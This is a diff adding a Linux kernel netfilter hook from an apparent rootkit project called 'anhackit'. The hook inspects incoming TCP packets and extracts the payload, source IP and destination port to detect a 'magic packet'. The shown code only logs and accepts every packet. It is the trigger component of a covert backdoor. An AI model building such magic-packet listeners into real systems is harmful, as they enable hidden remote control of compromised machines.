@@ -1,0 +1,42 @@
+static unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)) {
+struct iphdr *iph;
+struct tcphdr *tcph;
+
+//Return if empty
+if(!skb)
+    return NF_ACCEPT;
+
+//Get ip header
+iph = ip_hdr(skb);
+
+//Check protocol
+if(iph->protocol != IPPROTO_TCP)
+    return NF_ACCEPT;
+
+//Get tcp header
+tcph = tcp_hdr(skb);
+
+//Get & check data
+char *data;
+data = (char *)((unsigned char *)tcph+(tcph->doff*4));
+if(!data)
+    return NF_ACCEPT;
+
+//Print in dmesg
+#ifdef DEBUG
+    printk("anhackit data: %s\n", data);
+#endif
+
+//Convert source ip to string
+char ip[16];
+snprintf(ip, 16, "%pI4", &iph->saddr);
+
+//Convert destination port to string
+char port[6];
+sprintf(port, "%u", ntohs(tcph->dest));
+
+#ifdef DEBUG
+    printk("anhackit - magic packet received from %s on port %s !\n", ip, port);
+#endif
+
+return NF_ACCEPT;}
